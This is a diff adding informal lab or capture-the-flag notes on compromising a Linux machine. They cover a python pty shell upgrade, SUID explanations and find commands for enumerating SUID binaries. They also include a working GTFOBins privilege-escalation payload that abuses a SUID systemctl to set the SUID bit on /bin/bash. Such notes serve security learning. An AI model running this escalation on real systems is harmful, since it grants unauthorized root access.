@@ -1,0 +1,58 @@
+
+✓ Compromise the webserver:
+
+used python file instead of burp
+
+
+We can use : python -c "import pty; pty.spawn('/bin/bash')"
+
+            -----> To get a proper name of the shell 
+
+
+REFER: 
+
+https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell
+
+https://netsec.ws/?p=337
+
+
+
+In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).
+
+For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.
+
+	https://imgur.com/ZhaNR2p
+
+On the system, search for all SUID files. What file stands out?
+
+----> Used this: find / -perm /4000 2> /dev/null
+
+For long listing: find / -user root -perm -4000 -exec ls -ldb {} \;
+
+	      OR, find / -user root -perm -4000 -exec ls -l {} \;
+
+
+But why ???????
+
+/bin/systemctl	
+
+
+We used our machine as a base line. In our machine systemctl does not have set 
+uid, so it can not normal for a reason.
+
+
+
+REFER: https://gtfobins.github.io/gtfobins/systemctl/
+
+to escalate privilege
+
+
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > $TF
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+
